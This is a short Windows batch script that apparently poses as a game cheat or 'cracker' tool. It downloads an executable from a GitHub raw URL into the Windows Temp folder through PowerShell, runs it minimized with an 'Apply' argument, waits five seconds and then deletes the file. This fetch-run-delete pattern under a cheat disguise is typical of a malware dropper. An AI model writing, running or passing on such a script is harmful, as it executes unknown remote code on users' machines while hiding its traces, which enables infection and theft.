@echo off
set "url=https://raw.githubusercontent.com/inshalliaqat/x10/main/x10cheats.exe"
set "destination=C:\Windows\Temp\x10cheats.exe"
set "arguments=Apply"

echo Cheaking Cracker...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%destination%')"
echo Waiting...
start /min "" "%destination%" %arguments%

timeout /t 5 /nobreak >nul 2>&1

echo ........
del "%destination%"